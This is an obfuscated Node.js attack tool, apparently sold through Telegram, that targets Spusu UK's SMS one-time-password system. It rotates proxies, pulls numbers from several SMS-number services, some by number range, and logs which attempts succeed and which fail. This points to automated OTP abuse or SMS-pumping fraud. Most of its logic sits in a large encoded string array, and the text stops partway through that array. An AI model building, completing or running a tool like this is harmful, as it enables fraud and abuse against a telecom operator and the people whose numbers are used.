const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const req = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missing = false;
  for (const m of req) {
    try {
      require.resolve(m);
    } catch (v15) {
      missing = true;
      break;
    }
  }
  if (missing) {
    console.log("\n[SETUP] Installing dependencies...");
    try {
      const v16 = {};
      v16.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v16);
    } catch (v17) {
      console.error("[ERROR] npm install failed"), process.exit(0x1);
    }
  }
}
const https = require("https"),
  http = require("http"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent");
const {
  SocksProxyAgent
} = require("socks-proxy-agent");
let OUT_DIR = __dirname,
  SUCCESSFUL_FILE = path.join(OUT_DIR, "successful.txt"),
  FAILED_FILE = path.join(OUT_DIR, "failed.txt"),
  DEBUG_FILE = path.join(__dirname, "debug.txt");
function getDesktop() {
  const v18 = require('os'),
    v19 = v18.homedir();
  for (const v20 of [path.join(v19, "Desktop"), path.join(v19, "OneDrive", "Desktop"), path.join(v19, "OneDrive - Personal", "Desktop")]) {
    if (fs.existsSync(v20)) return v20;
  }
  return v19;
}
function setupOut(v21) {
  const v22 = process.platform === "android" || fs.existsSync("/storage/emulated/0");
  let v23;
  if (v22) v23 = "/storage/emulated/0/NOT REXY/spusu";else {
    let v24 = null;
    if (v21 && typeof v21 === "string") {
      const v25 = path.resolve(v21.trim());
      if (fs.existsSync(v25)) {
        const v26 = path.dirname(v25);
        if (v26 !== __dirname) v24 = v26;
      }
    }
    if (!v24) v24 = getDesktop();
    v23 = path.join(v24, "NOT REXY", "spusu");
  }
  try {
    const v27 = {};
    v27.recursive = true, fs.mkdirSync(v23, v27);
  } catch (v28) {
    v23 = __dirname;
  }
  OUT_DIR = v23;
  return SUCCESSFUL_FILE = path.join(v23, "successful.txt"), FAILED_FILE = path.join(v23, "failed.txt"), v23;
}
function debugLog(v29, v30, v31) {}
const B = chalk.hex("#7B2FFF"),
  C = chalk.hex("#00E5FF"),
  Y = chalk.hex("#FF6B6B"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  GR = chalk.hex("#00E5FF"),
  DIM = chalk.hex("#555555");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("   ____                                   "));
    console.log(B("  / ___| _ __  _   _ ___ _   _            "));
    console.log(C("  \\___ \\| '_ \\| | | / __| | | |           "));
    console.log(C("   ___) | |_) | |_| \\__ \\ |_| |           "));
    console.log(Y("  |____/| .__/ \\__,_|___/\\__,_|           "));
    console.log(Y("        |_|                               \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Target    : ") + Y("Spusu UK — SMS OTP           ") + W('│'));
    console.log(W("│ [•] Version   : ") + B("SPUSU-V1.0.0                 ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
class NexaRateLimiter {
  constructor(v32) {
    this.delayMs = v32;
    this.queue = [], this.processing = false;
  }
  ["enqueue"](v33) {
    return new Promise((v34, v35) => {
      this.queue.push(async () => {
        try {
          v34(await v33());
        } catch (v36) {
          v35(v36);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v37 = this.queue.shift();
      await v37(), await new Promise(v38 => setTimeout(v38, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  twoOoLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v39) {
  return new Promise((v40, v41) => {
    const v42 = {};
    v42.Accept = "text/plain", v42.Connection = "close";
    const v43 = {};
    v43.hostname = "smsbower.page";
    v43.port = 0x1bb, v43.path = "/stubs/handler_api.php?" + v39, v43.method = "GET";
    v43.headers = v42;
    const v44 = v43,
      v45 = https.request(v44, v46 => {
        let v47 = '';
        v46.on("data", v48 => v47 += v48), v46.on("end", () => v40(v47.trim()));
      });
    v45.on("error", v49 => v41(new Error("SmsBower net: " + v49.message))), v45.setTimeout(0x3a98, () => {
      v45.destroy();
      v41(new Error("SmsBower timeout"));
    }), v45.end();
  });
}
function smsBowerFetchNumber(v50, v51, v52, v53) {
  let v54 = "api_key=" + encodeURIComponent(v50) + "&action=getNumber&service=" + encodeURIComponent(v51 || 'fb');
  v52 && String(v52).trim() !== '0' && String(v52).trim() !== '' && (v54 += "&country=" + encodeURIComponent(v52));
  return v53 && parseFloat(v53) > 0x0 && (v54 += "&maxPrice=" + encodeURIComponent(v53)), smsBowerRequest(v54).then(v55 => {
    if (v55.startsWith("ACCESS_NUMBER:")) {
      const v56 = v55.split(':'),
        v57 = {};
      return v57.activationId = v56[0x1], v57.phoneNumber = v56[0x2], v57;
    }
    if (v55 === "NO_NUMBERS") throw new Error("SMS Bower: No numbers available right now");
    if (v55 === "NO_BALANCE") throw new Error("SMS Bower: Insufficient balance");
    if (v55 === "BAD_KEY") throw new Error("SMS Bower: Invalid API key");
    throw new Error("SMS Bower error: " + v55);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexRequest(v58, v59, v60) {
  return new Promise((v61, v62) => {
    const v63 = JSON.stringify(v59),
      v64 = {
        'hostname': "api.zenex.cloud",
        'port': 0x1bb,
        'path': v58,
        'method': "POST",
        'headers': {
          'mapikey': v60,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v63)
        }
      },
      v65 = https.request(v64, v66 => {
        let v67 = '';
        v66.on("data", v68 => v67 += v68);
        v66.on("end", () => {
          try {
            v61(JSON.parse(v67));
          } catch (v69) {
            v62(new Error("Zenex: Invalid JSON"));
          }
        });
      });
    v65.on("error", v70 => v62(new Error("Zenex net: " + v70.message))), v65.setTimeout(0x3a98, () => {
      v65.destroy();
      v62(new Error("Zenex timeout"));
    }), v65.write(v63);
    v65.end();
  });
}
async function zenexFetchNumber(v71, v72) {
  const v73 = await zenexRequest("/user/getnumber", {
    'range': String(v72).trim()
  }, v71);
  if (v73?.["status"] === 0xc8 && v73?.["data"]?.["number"]) return v73.data.number;
  if (v73?.["status"] === 0x190 && v73?.["message"]?.["toLowerCase"]()["includes"]("insufficient")) throw new Error("Zenex: Insufficient balance");
  if (v73?.["status"] === 0x194 || v73?.["message"]?.["toLowerCase"]()["includes"]("no number")) throw new Error("Zenex: No numbers available for range " + v72);
  throw new Error("Zenex [" + (v73?.["status"] || "ERR") + "]: " + (v73?.["message"] || "Failed"));
}
function stripRid(v74) {
  return String(v74).trim().replace(/[xX*]+$/, '').replace(/\D/g, '');
}
function twoOoFetchNumber(v75, v76, v77) {
  return new Promise((v78, v79) => {
    const v80 = stripRid(v76),
      v81 = {};
    v81.rid = v80;
    const v82 = JSON.stringify(v81),
      v83 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v77,
        'method': "POST",
        'headers': {
          'mauthapi': v75,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v82)
        }
      },
      v84 = https.request(v83, v85 => {
        let v86 = '';
        v85.on("data", v87 => v86 += v87), v85.on("end", () => {
          try {
            const v88 = JSON.parse(v86);
            if (v88?.["meta"]?.["code"] === 0xc8 && v88?.["data"]?.["no_plus_number"]) v78(v88.data.no_plus_number);else v79(new Error(v88?.["message"] || v88?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v89) {
            v79(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v84.on("error", v90 => v79(new Error("2oo9 network: " + v90.message))), v84.setTimeout(0x2710, () => {
      v84.destroy();
      v79(new Error("2oo9: Timeout"));
    });
    v84.write(v82), v84.end();
  });
}
function fn1() {
  const v91 = ['Aw1mBLe', 'Bwf1DgHHCgK', 'z3jLyxnL', 'rKXht2O', 'Aw5PDa', 'u2vJluzLDgnOlurLC3q', '8j+mKe1LDgeO', 'DMvYC2LVBG', 'lJaUmc4WifnHzMfYAs81mZCUmZy', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'mtjRuxjjr2S', 'zhzvDem', 'rMv0y2HPBMCGC2vZC2LVBIb0B2TLBI4UlG', '8j+tUcbjBNn0ywDYyw0', 'Bgfku0i', 'ms4WlJa', 'C29JA3m0', 'DMfSDwu', 'iZu1ntu1nq', 'iZG4odG4oa', 'C3b1C3u', 'u2vwrwS', 'reLKqxC', 'l3vZzxiVz2v0BNvTyMvY', 'iefqssblzxKGkg1HDxrOyxbPktO', 'iokgKIa', 'icdILzeGienVBNrHy3q6ihqUBwuVC2nYyxbLCL9RAw5NihrVihjLz2LZDgvYicaGicdILze', 'D2LUmZi', 'BhLUy1e', 'AM9jCfy', 'tMv4yu9uua', 'y29UDgvUDc1LBMnVzgLUzW', 'C2vJlwnOlxvHlxbSyxrMB3jT', 'uwvLzha', 'Ew1qENe', 'BMv4yunVBMzPzW', 'D256t3e', 'l2fWAs9WAw5N', 'Ag9ey0K', '4PYtie91Dhb1DcaGoIa', 'tuvfz0C', 'Eu9oDNq', 'CxvLC3rPB24', 'uun5B2y', 'EKL3twe', 'u2vJlunOlvvHlvbSyxrMB3jT', 'BfnYufO', 'u0vtu0LptKLepq', 'uxj5weG', 'cIaG4PYxie5VihzHBgLKihnLBgvJDgLVBI4k', 'DNnNrgO', 'DxnL', 'vw5RBM93BKnqvq', 'mJe4mZK3y0z3BNbp', 'zw1WDhK', 'qKzxuNm', 'zw4Tr0iSzw4Tvvm7Ct0WlJKSzw47Ct0WlJG', 'DKfZufm', 'BMv3', 'zfvPAwK', 'lIbbzgqGyw5VDgHLCJ8', 'ufHuuwW', 'yMfUBMvK', 'C29YDa', 'BxnwBuK', 'ywDLBNq', 'iK5VDf9biejYyw5KiJT2psi4iG', 'jMfJDgLVBJ1NzxroDw1IzxiMC2vYDMLJzt0', 'Agv4', 'Dt0XlcbP', '4PYtieXVywrLzca', 'C2LUz2XL', 'DMvYAwz5', 'C2vHCMnO', 'C2vSzwn0', 'cIaG4PYxie5VigHPDhmGAw4Gy29UC29SzsbMzwvKlGO', 'DxrMoa', 'Dgv4Dc9WBgfPBG', 'qLbOBxm', 'C2v0u3rHDhvZ', 's0PlwM0', 'rMfPBgvKig9Uia', 'Evjit2K', 'twf4ihjLDhjPzxmGCMvHy2HLza', 'lI4U', 'u2vJlunOlvvHlu1VyMLSzq', 'u3b1C3uGvuSG4OcuifnnuYbpvfaGicaGicaGicaGia', 'Dg9mB3DLCKnHC2u', 'tvDuteS', 'Ag9ZDg5HBwu', 'C2vYDMvYrw5KCg9PBNq', 'y2HHBgS', 'tg1XCu0', 'z3jLzw5cCMLNAhq', 'u0TjtKCT', 'zNjVBq', 'y3vYCMvUDfnLC3nPB24', 'EgHlzfu', 'C29uyue', 'AKrsveO', 'Cgf0Ag5HBwu', 'x3bYB2nLC3m', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'C3rYAw5NAwz5', 'u3vJy2vZC2z1Ba', 't0H4BuW', 'u2vJluzLDgnOlvnPDgu', 'BwTKAxjtEw5J', 'BMf2AwDHDgu', 'tK9uifjfr0LtvevsruqGlYbsru1pvKve', 'iK5VDdTbkujYyw5KiJT2psiYnci', 'B3jRy0S', 'icaGx19Fksb8ihXFksb8ihXFFcbCx18Gxcb8x3WGFcaGicaGicaGicaG', 'AKjXuwm', 'icdILzeGieHxsuqGica6ia', 'uM9ZD0W', 'BNbTigLUC3rHBgWGAhr0ChmTChjVEhKTywDLBNqGC29JA3mTChjVEhKTywDLBNqGy2HHBgTana', 'rMfPBgvK', 'A0DkC1C', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6iduWxtO', 'rMf0ywWGzxjYB3i6ia', 'zM9YrwfJAa', 'CMvHzezPBgvtEw5J', 'y3j5ChrV', 'CMvJDxjZAxzL', 's2nuvK0', 'r3zrCNi', 'EgzUs1C', 'CgXHDgzVCM0', 'icdILia', 'y2XVC2u', 'z3vUEMLWu3LUyW', '4PYp77Ipien1C3rVBsbgAwXLifbHDgG', 'BNnjuvy', 'zMfPBgvKlNr4Da', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'y3jLyxrLsgfZAa', 'C3rLEa', 'C3bSAwnL', '4PscifVIGkjDief1DgHVCIaGica6ia', 'DgvZDa', 'iK5VDc9bkujYyw5KiJT2psi4iG', 'y291BNrLCG', 'z2v0ugf0Aa', 'z2DLCG', 'Bw1vwKK', 'DwjnCK8', 'vevfBMi', 'Aw5JBhvKzxm', 'q291BNrYEsbJB2rLicGWid0Gyw55ksbBzgvMyxvSDdOGmf06', 'sg9TzxbHz2u', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'vgLTzw91Da', 'Ahr0Chm', 'ChjVDMLKzxi', 'yMfJAW', 'kZq0', 'sg5QDuC', 'mtm5mJCZmLrcCKnmzG', 'Ew9AuMq', 'C21ZqM93zxjdB25MAwC', 'AwHdyMG', 'v3z6AvK', 'iokCPIbty3jHCgvYieTPBMC', 'g1SYsHTBm0OBw0G', 'oI8V', 'l3n0DwjZl2HHBMrSzxjFyxbPlNbOCd8', 'DxbKyxrL', 'iKDVB2DSzsbdAhjVBwuIo3y9iG', 'tK9uifjfr0Ltvevsruq', 'zLfKt3q', 'iZmZmZmZmW', 'y29UC29SzvbHDgG', 'q2j5rKi', 'sKzPvKS', 'EfPVwuO', 'shrlB3y', 'zMLSDgvY', '4PscifVIGkjDifzLCNnPB24Gica6ia', '4PYtifrHCMDLDcaGoIa', 'rvjs', 'C2fSzxnJAgfUBMvS', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'A3ryBxe', 'ihrHCMDLDhm', 'BvH3DNO', 'lxnLC3nPB24T', 'u2vJlunOlvvH', 'D3nMD0C', 'wMvUzxG6ieLUDMfSAwqGsLnptG', 'DgXIvwq', 'Dg9vChbLCKnHC2u', 'u0vsvKvsmG', 'BNvTyMvYCY50Ehq', 'q29UC29SztOGsw52ywXPzcbku09o', 'ChLqDfO', 'EKDyBLm', 'CejquMq', 'BM9Uzq', 'xtOG', 'BfHstw8', 'cIaGqxbWoIa', 'y291BNrYEq', 'u21ZqM93zxiGDgLTzw91Da', 'DxnLCG', 'tMv4yu9uudOGvgLTzw91Da', 'z3PPCcWGzgvMBgf0zsWGyNiSihPZDgq', 'vhjPz2DLCMvKie9uucbMB3iG', 'lcaIq2HYB21PDw0Io3y9iG', 'sfLcDNG', 'D2HPBguGkhrYDwuPihT9', 's1HvBue', 'r2zxD2e', 'z0DgvwG', 'C29Tzq', 'u01tiejVD2vYoIboBYbUDw1IzxjZigf2ywLSywjSzsbYAwDODcbUB3C', 'AvDtDuu', 'CgHVBMvoDw1Izxi', 'rLLwBvy', 'uK9kre0', 'mhWZFdf8nhWY', 'qxzIyuO', 'icdINA8G', 'qLjjrLy', 'CLjVwvi', 'vKPsr2y', 'wwrQBMG', 'wgPYt0O', 'u2vYDMLJzsbJB2rLifTKzwzHDwX0oIbMyL06', 'u01tiejVD2vYigvYCM9YoIa', 'ywnJzxb0', 'B2jQzwn0', 'icaVif9Fx3WGxYbFxYaGxYaGif8Gx19Fif8GicbFicaGicaGicaGicaG', 'Ag9TzwrPCG', 'zw1vr2m', 'C2LUz2XLtNvTyMvY', 'icaG', 'C2vJlwzLDgnOlxnPDgu', 'q2DuBKq', 'zgvIDwCUDhH0', 'kcGOlISPkYKRksSK', 'reLnAuG', 'zgjvrwO', 'rw50zxiGwMvUzxGGqvbjieTLEsaOBwfWAwTLEsK6', 'u3PArw8', 'i0zgnKi2qG', 'yxbPlNPLBMv4lMnSB3vK', 'B3jPz2LU', 'u2vUzgLUzYbpvfaGDg8G', 'DgHYzwfKCW', 'icboBYbWCM94AwvZignVBMzPz3vYzwqGkhj1BM5PBMCGzgLYzwn0kq', 'wMvUzxGGwW', 'wMvUzxGGA2v5igzVDw5KicG', 'iLDPBMrVD3mI', 'r09NqwK', 'DKfjv1q', 'iokCLYbty3jHCgvYieTPBMC', 'BejnA04', 'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44', 'Dg90ywXoDw1IzxjZ', 'wLfQyu8', 'BgjiAhK', 'zLjcD0G', 'uurftuu', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'icaGicaGicaGicaGicaGicaGicaGica', 'AxnuvfK', 'i0zgrdCWma', 'A1DQAxC', 'BLj4D0G', 'uMvZCg9UC2uGC3rHDhvZoIa', 'DxnLCI1Hz2vUDa', 'Bg9JAW', 'yxbWzw5KrMLSzvn5BMm', 'EK9gqLa', 'CwDOBeq', 'z3PPCa', 'y3DYzva', 'CMvXDwvZDa', 'icaGx19FxYaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaGicaG', 'y29UDgvUDc10ExbL', 'zKjrrw8', 'AgL0CW', 'icb8icbty2fUBMvKoIa', 'C3vJy2vZC2z1Ba', 'C0Lrzu4', 'D1bIv0y', 'CMvHC29U', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'icbqCM94AwvZigXVywrLzdOG', 'z3jLzw4', 'zxHPC3rZu3LUyW', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'yuDSue0', 'DMjrCfm', 'AKj0AMW', 'z2zTy0i', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 'seX0vNO', 'tMv4yu9uucbUzxr3B3jRoIa', 'CgfYC2u', 'qw1LAxO', 'CMvUzgvY', 'BwfUDwfS', 'C29JA3m1oI8V', 'wePsquy', '8j+tSsbttvmGqM93zxi', 'C3rHDhvZ', 'CMvHzgXPBMu', 'CMvK', 'icaGia', 'A2v5ChjLC3m', 'zM9YBNm', 'qNj1qMi', 'Aw5MBgf0zvn5BMm', 'y3LHBG', 'vxnLihnHDMvKigTLEq', 'ChjVy2vZC2vK', 'sg93ig1HBNKGBNvTyMvYCYb0BYbMzxrJAd8Gw2rLzMf1Bhq6iduWxtO', 'zgLYBMfTzq', 'ks4GvxnLigL0pW', 'nZyZnde4sNLOwgz2', 'D29YA2vYx3rOCMvHzhm', 'ywXS', 'ze1zzgG', 'icaJicaGuMfUz2uGicaGicaGicaGicaGieHPDhmGiefWChm', 'CMfUz2u', 'Dwfzq1i', 'nJiYndK1Ae9uqxDU', 'B2rVq1a', 'C2LN', 'l2fWAs92zxjPzNK', 'zw4TvvmSzw47Ct0WlJK', 'u2nYyxbLCIblAw5N', 'ChfKrwG', 'vuTlwMe', 's3rvAfC', 'wfb0EuW', 'Bwv0yq', 'igTLEsbMB3vUzcaO', 'uMvTB3zLihnHDMvKigTLEq', 'DM9SDhG', 'y29Uy2f0', 'qu5lsu5hlq', 'CgfKrw5K', 'qZPCv2LUzg93C1XtExn0zw0ZmLXxAw5KB3DZug93zxjtAgvSBfX2ms4WxhbVD2vYC2HLBgWUzxHLic1oB1bYB2zPBguGlunVBw1HBMqGiG', 'BM9YBwfS', 'CeHYEuK', 'DvjuBwO', 'cIaG4PYtifnLBgvJDgvKoIa', 'tK9FtLvnqKvsuW', 'u3rLEa', 'BM8GBNvTyMvY', 'Dg9gAxHLza', 'veLHvMy', 'C2LK', 'Dg9Rzw4', 'B3DAswm', '4QYf77IpiejHy2S', 'BNvTyMvYC0zPBgu', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', 'y29UC3rYDwn0B3i', 'rw50zxiG', 'v0D1C3C', 'z1PNEg0', 'tMv4yu9uudOGtM8GBNvTyMvYihjLDhvYBMvK', 'zxHWAxjLza', 'zgvZDhjVEq', 'CMvWBgfJzq', 'C0jXu2i', 'vNvnsNm', '4PQHifzVBhr4icGYB285ienSB3vKkq', 'u2f2zsbRzxK/', 'B0LqtxK', 'Ahr0Chm6lY93D3CUC3b1C3uUy28UDwS', 'BMv4yq', 'Aw50zxjUywX1C2vYDg9Rzw4', 'su5vCxi', '4PQHie5LEgfpvfaGu2vYDMLJzsaOqxv0BYbgzwvKkq', 'CMvMzxjLCG', 'y29YCW', 'qNvwu0i', 'C29JA3mTChjVEhKTywDLBNq', 'cIaG4PYxifnLC3nPB24Gvg9Rzw4GBg9ZDc4GqwjVCNrPBMCUlI4k', 'zgvIDq', 'rwrxBge', 'yLPssvq', 'yNL0zuXLBMD0Aa', 'icbtufvtvsbvsYbpvfaGvfjjr0DfuIdIGjqGq09nueXfveuGicaGicaGicaGia', 'qKfex0Tfwq', 'mJyXmJqWm2nPEvfuEG', 'iokgUYbty3jHCgvYieTPBMC', 'Be1oDeS', 'mM9VotOGsw52ywXPzcbku09o', 'cIaG4PYxieXPy2vUC2uGDw5HDxrOB3jPEMvKlGO', 'v1zvvg4', 't1rqifnLBNq', 'EgDgAuG', 'Cg9YDa', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'C2vJq2Hvyq', 'vNviEwW', 'Eu9ltfa', 'ChjPB3jPDhK', 'ExzRAge', 'C21ZyM93zxjFA2v5lNr4Da', 'BuHxEuC', 'quX3Cvm', 'z2v0q29VA2LLu3rYAw5N', 'yM9Sza', 'C2D3rgm', 'tK9FqKfmqu5drq', 'sg93ihrVihnLBgvJDcbYyw5Nzxm/', 'CMvZDw1L', 'cIaG4Pwu4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwx', 'CMv2B2TLza', 'y3ftDg0', 'iZaWqZLbnW', 'Be5ZzvK', 'ywrKtg9N', 'r0zYs2K', 'C2XPy2u', 'iZaWrtvgrG', 'vMrkDLa', '8j+mKcbeAxjLy3qGq29UBMvJDgLVBIaOtM8GuhjVEhKP', 'wwvZ', 'C2v0sw50zxj2ywW', 'iokuGIa', 'C3rHCNrZv2L0Aa', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6ntbDoG', 'D3jPDgu', 'iK5VDd9bx0jYyw5KiJT2psiYnci', 'yxbPx2TLEt0', 'C3vJy2vZCW', 'DeXgCxq', 'Fe9uuf9tru5ucG', 'iK5VDd1bx0jYyw5KiJT2psi5osi', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 'v2rzt3O', 'zgf0yq', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'mJKZoteWCKPtEufb', 'Bwf0y2G', 'y3rYBa', 'BKnqrui', 'D2HPDgu', 'yxbWBhK', 'rMf0ywWGzxjYB3iGB24G', 'mM9VotOGvgLTzw91Da', 'iK5VDcHbo0jYyw5KiJT2psi5osi', '8j+tSsbttvmGqM93zxiGkef1Dg8GrMvLzcK', '8j+tUeLhka', 'icdILztILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzC', 'vxnLCG', 'zgLNzxn0', 'C2vYDMLJzq', 'qu5gA0G', 'zMf1wxq', 'BMv4yv9RzxKUDhH0', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'uMv0CNKGyxr0zw1WDhmGCgvYig51BwjLCIbBzgvMyxvSDdOGmL06', 'C3rKAw4', 'cIaGvxnLiokgKs/IHPmGyxjYB3DZigfUzcbfBNrLCIb0BYbZzwXLy3qGkg9Yihr5CguGBNvTyMvYks4', 'C3vJy2vZC2z1Bc50Ehq', 'y1rwEue', 'u3rWAhi', 'EKzYtKm', 'tM8GAgfYzhDHCMuGzgf0yq', '8j+mKcbnzxrH', 'rNz4Bfa', 'CMv0CMLLCW', 'whHJthq', 'qMPIBwu', 'zhb4tK0', 'yxbPlJjVBZKUy2XVDwq', 'rKvLvvu', 'icaO', 'tg9KC1y', 'CMv0DxjU', 'icaGicaGia', 'icbCx19FifX8icDFifX8ihWGFcaVif9FFcb8ihWGFcaGicaGicaGicaG', 'ue9tva', 't09jshK', 'B2jzweK', 'BuTXru0', '8j+uPsbtDgv4icGYB285ienSB3vKkq', 'iK5VDdTbpujYyw5KiJT2psiYnci', 'BMv4yw90ChnLCNzPy2uUy29T', 'ofrvBu9RsG', 'rw50zxiGuhjVEhKGrMLSzsbqyxrOoG', 'iK5VDd1bp0jYyw5KiJT2psi4iG', 'ug9ABLO', 'rxPmtMu', 'y3vZDg9T', 'zgvSzxrL', 'Ag9ZDa', 'ugr0q04', 'l3bYB2mVy3b1Aw5MBW', 'EMvUzxHdB25MAwC', 'CMvTB3zLtgLZDgvUzxi', 'zw50CMLLCW', 'AxnbyNnVBhv0zq', 'wvjHBem', 'zKntEey', 'yNjVDgXPrgvJB21WCMvZC1n5BMm', 'DMvyCKG', 'jgrPC2SGpsaOr2v0lunPBuLUC3rHBMnLifDPBJmYx0XVz2LJywXeAxnRic1gAwX0zxiGj0rLDMLJzuLepvWNqZPCjYCGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLzVBhvTzvnLCMLHBe51BwjLCJSG', 'cLTtrvrvuf0Gsw5ZDgfSBgLUzYbKzxbLBMrLBMnPzxmUlI4', 'CMvMCMvZAfnLC3nPB24', 'ywnJzxb0lwXHBMD1ywDL', 'reTXq0G', 'ChvZAa', '4PQHifPLBMv4', 'oYbdtvnmB2nHBgu9zw4Tr0i7ig1YC3jVDxrLpvnfuLzfuJi7ihn0yxLpBLrOAxntAxrLpxrYDwu7igfJy2vWDfnWDxn1q29VA2LLCZ1UzwnLC3nHCNK', 'iK5VDf9biejYyw5KiJT2psiYnci', 'q29UC29SzsbMzxrJAcbMywLSzwq', 't25LrhjPDMuGlsbqzxjZB25HBa', 'uNncvvO', 'AhHyAK4', 'Cgf0Aa', '4PscifVIGkjDifrVB2WGicaGica6ia', 'wfjvvLa', 'zxjYB3i', 'EwvSBg93', 'B3rhALa', 'sw52ywXPzcbWCM94Eq', '8j+tMezcka', 'BwfW', 'v0nIr3y', 'CMv0CNK', 'uwfWDe8', 'u1bvu1uTvJeUmc4WicaGicaGicaGicaGicaGica', 'EujQsgu', '4QYf77IpieDViejHy2S', 'uwDNB3C', 'DNbAAMC', 'CMfUzg9T', 'CgHVBMuUDhH0', 'BhLbCfy', 'y2fSBa', 'CxvLDwu', 'zgvMBgf0zq', 'Bvj5C2W', 'rM91BMqGC2f2zwqGqvbjieTLEsaOlI4U', 'zhzeueO', 'rw50zxiGtMv4yu9uucbbueKGs2v5oG', '8j+uJsbbDxrVifjHBMDLiezPBMrLCIaOC2nHBIbJB25ZB2XLkq', 'C2fTzs1VCMLNAw4', 'Ahr0Ca', 'tw96AwXSys81lJaGke1Hy2LUDg9ZAdSGsw50zwWGtwfJie9tifGGmtbFmtvFnYKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'kI8Q', 'cIaG', 'AxjTvNG', 'DhjPBq', 'ALP2tfy', 'D3zitLq', 'x3nPzf8', 'qwnJzxb0', 'yw5KCM9Pza', 'C2vJlwnOlxvH', 'mM9VotOGtM8GBNvTyMvY', 'igHPDhmk', 'Aw5WDxq', 'zMLUza', 'B3Hdzee', 'mJeWodq5mwfJyvr6ua', 'tM8SigvUDgvYig5LDYbRzxK', 'rw50zxiGBMv3igTLEq', 'l2fWAs92ms9UDw1IzxjZl2DLDa', 'g1SYsW0k', 'v29tB3i', 'CMfUzg9TqNL0zxm', 'Dg9tDhjPBMC', 'vM9SDhG', 'y2fTDeq', 'y2HHAw4', 'thfIvvm', 'y1jOsM8', 'DLPwvgG', 'D0jZsfG', 'y3jLyxrLsw50zxjMywnL', 'cIaG4PYxieXPy2vUC2uGCMv2B2TLzcbIEsbZzxj2zxiUiev4AxrPBMCUlI4k', 'D2XXvwq', 